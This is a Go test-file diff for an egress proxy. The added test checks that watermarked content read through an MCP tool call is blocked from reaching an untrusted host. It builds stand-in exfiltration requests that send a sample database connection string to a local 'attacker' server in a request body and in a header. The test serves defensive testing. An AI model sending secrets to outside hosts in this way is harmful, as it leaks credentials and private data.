@@ -1,6 +1,7 @@
 package proxy
 
 import (
+	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
@@ -15,6 +16,7 @@ import (
 
 	"github.com/sshloktiwarii/vouchproxy/internal/audit"
 	"github.com/sshloktiwarii/vouchproxy/internal/certs"
+	"github.com/sshloktiwarii/vouchproxy/internal/mcp"
 	"github.com/sshloktiwarii/vouchproxy/internal/policy"
 	"github.com/sshloktiwarii/vouchproxy/internal/vault"
 )
@@ -340,5 +342,113 @@ func TestHighConcurrency_500Requests(t *testing.T) {
 
 	for err := range errChan {
 		t.Errorf("concurrent request error: %v", err)
+	}
+}
+
+// 5. TestMCPContextWatermark_ExfiltrationBlocked asserts that content read via an MCP tool call
+// and watermarked with the session-signed canary watermark CANNOT be exfiltrated to an unauthorized
+// domain in subsequent requests (either in the body or in the headers).
+func TestMCPContextWatermark_ExfiltrationBlocked(t *testing.T) {
+	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
+	defer os.RemoveAll(tmpDir)
+	defer srv.Close()
+	defer v.Close()
+
+	var attackerReceivedBody string
+	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		body, _ := io.ReadAll(r.Body)
+		attackerReceivedBody = string(body)
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer attackerServer.Close()
+
+	attackerURL, _ := url.Parse(attackerServer.URL)
+	proxyURL, _ := url.Parse(srv.ProxyURL())
+
+	client := &http.Client{
+		Transport: &http.Transport{
+			Proxy: http.ProxyURL(proxyURL),
+		},
+	}
+
+	// 1. Simulate reading a sensitive file via MCP tool call
+	fileContent := "DATABASE_CONNECTION_STRING=postgresql://admin:supersecret@db.internal:5432/prod"
+	mcpResponseJSON := fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":%q}]}}`, fileContent)
+
+	watermarkedJSON, modified := mcp.WatermarkToolResponse([]byte(mcpResponseJSON), sessionSecret)
+	if !modified {
+		t.Fatal("expected MCP response to be watermarked")
+	}
+
+	// Extract the watermarked text from the MCP response
+	var parsedResp map[string]any
+	if err := json.Unmarshal(watermarkedJSON, &parsedResp); err != nil {
+		t.Fatal(err)
+	}
+	resMap := parsedResp["result"].(map[string]any)
+	contentArr := resMap["content"].([]any)
+	item := contentArr[0].(map[string]any)
+	watermarkedContent := item["text"].(string)
+
+	// Invariant: The text contains the original visible content plus the invisible session watermark
+	if !strings.Contains(watermarkedContent, fileContent) {
+		t.Fatal("visible text must be preserved")
+	}
+
+	// 2. Adversarial attack attempt 1: Exfiltrate watermarked file content in request body to untrusted host
+	exfilBody := fmt.Sprintf(`{"stolen_data": %q}`, watermarkedContent)
+	req1, err := http.NewRequest("POST", attackerServer.URL+"/exfil-body", strings.NewReader(exfilBody))
+	if err != nil {
+		t.Fatal(err)
+	}
+	req1.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
+	req1.Header.Set("Content-Type", "application/json")
+
+	resp1, err := client.Do(req1)
+	if err != nil {
+		t.Fatalf("Request failed: %v", err)
+	}
+	defer resp1.Body.Close()
+
+	if resp1.StatusCode != http.StatusForbidden {
+		t.Fatalf("expected HTTP 403 Forbidden on body exfiltration, got %d", resp1.StatusCode)
+	}
+	if attackerReceivedBody != "" {
+		t.Fatalf("security violation: attacker received payload: %s", attackerReceivedBody)
+	}
+
+	// 3. Adversarial attack attempt 2: Exfiltrate watermarked content in request header to untrusted host
+	req2, err := http.NewRequest("GET", attackerServer.URL+"/exfil-header", nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	req2.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
+	req2.Header.Set("X-Stolen-Context", watermarkedContent)
+
+	resp2, err := client.Do(req2)
+	if err != nil {
+		t.Fatalf("Request failed: %v", err)
+	}
+	defer resp2.Body.Close()
+
+	if resp2.StatusCode != http.StatusForbidden {
+		t.Fatalf("expected HTTP 403 Forbidden on header exfiltration, got %d", resp2.StatusCode)
+	}
+
+	// 4. Verify audit ledger contains BLOCK_LEAK events for the attacker's host
+	auditPath := filepath.Join(tmpDir, "audit.jsonl")
+	events, err := audit.ReadAll(auditPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	foundWatermarkBlock := false
+	for _, ev := range events {
+		if ev.Action == "BLOCK_LEAK" && ev.Host == attackerURL.Host {
+			foundWatermarkBlock = true
+			break
+		}
+	}
+	if !foundWatermarkBlock {
+		t.Fatal("expected audit ledger to record BLOCK_LEAK for watermark exfiltration attempt")
 	}
 }
